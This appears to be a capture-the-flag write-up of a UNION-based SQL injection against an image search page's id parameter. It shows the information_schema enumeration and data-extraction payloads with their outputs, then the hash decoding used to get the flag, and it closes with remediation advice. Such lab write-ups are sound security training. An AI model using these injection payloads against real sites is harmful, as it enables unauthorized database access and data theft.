# SQL injection on the image search field in the image search page

## Vulnerability Details:

### Affected URL: `http://{IP_ADDR}/?page=searchimg&id=`

### Issue Description:
This security issue pertains to a vulnerability in the SQL injection within the website. SQL expressions are treated as intended rather than being escaped or treated as regular strings. This vulnerability allows us to exploit the system and extract data from the database by sending requests through the input field.

### Potential Exploitation:
Since the input field expects an ID number, the corresponding SQL query should resemble:
```
SELECT title, url FROM list_images WHERE images.id = ${input_value}
```
The query would print the title and the url of the image with the given image ID. Since we don't need the website to display data about any specific image, we can choose the ID `-1`, which is unlikely to match any existing ID.<br />
<br />
To append our request after the original query, we can use the `UNION` operator, and perform an UNION-based SQL injection attempt, which combines the result sets of two or more `SELECT` statements:
```
SELECT title, url FROM list_images WHERE images.id = -1 UNION SELECT XXX FROM XXX
```
This allows us to execute our exploit immediately after the original request.<br />
<br />
We aim to retrieve data from the `information_schema`. In SQL, `information_schema` is a schema providing metadata about database objects. We are particularly interested in the `table_name` and `column_name` columns from `information_schema.columns` to understand the general structure of the database.<br />
<br />
With this in mind, we have:<br />
<br />
INPUT:
```
-1 UNION SELECT table_name, column_name FROM information_schema.columns
```

OUTPUT:
```
ID: -1 UNION select table_name, column_name FROM information_schema.columns 
Title: title
Url : list_images

ID: -1 UNION SELECT table_name, column_name FROM information_schema.columns 
Title: comment
Url : list_images
```

The result reveals a `list_images` table, which should correspond to the available table, and two interesting columns: `title` and `comment`. Subsequently, we will send the following request to retrieve these two fields from all images in the database:<br />
<br />
INPUT:
```
-1 UNION SELECT title, comment FROM list_images
```

OUTPUT:
```
ID: -1 UNION SELECT title, comment FROM list_images
Title: Hack me ?
Url : If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46
```
So, we decoded the MD5 string which gives `albatroz` and then calculated the `SHA256` sum of it to obtain the flag.

### Immediate Actions Required:
* SQL Injection Prevention:
   - Perform input validation and sanitization to prevent SQL injection attacks.
   - Use parameterized queries or prepared statements to handle dynamic SQL queries securely.
   - Implement strict access controls and least privilege principles to restrict database access.
